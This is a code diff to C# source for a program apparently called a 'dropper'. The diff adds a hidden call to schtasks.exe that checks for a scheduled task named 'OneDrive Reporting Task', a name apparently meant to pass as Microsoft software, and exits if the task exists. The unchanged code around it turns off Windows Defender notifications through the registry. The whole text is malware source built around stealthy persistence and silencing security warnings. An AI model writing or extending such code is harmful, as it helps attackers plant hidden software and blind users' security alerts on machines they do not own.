@@ -1,7 +1,7 @@
-﻿using System.IO;
+﻿using System;
+using System.IO;
 using System.Diagnostics;
 using System.Threading;
-using System.Reflection;
 using Microsoft.Win32;
 
 namespace dropper
@@ -10,6 +10,23 @@ namespace dropper
     {
         static void Main(string[] args)
         {
+            Process schproc = new Process()
+            {
+                StartInfo = new ProcessStartInfo()
+                {
+                    FileName = "schtasks.exe",
+                    Arguments = "/query /tn \"OneDrive Reporting Task\"",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true
+                }
+            };
+            schproc.Start();
+            string error = schproc.StandardError.ReadToEnd();
+            schproc.WaitForExit();
+            if (!error.Contains("ERROR: The system cannot find the file")) Environment.Exit(1);
+
             Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", "Enabled", 0);
 
             string xmlpath = Path.GetTempFileName();
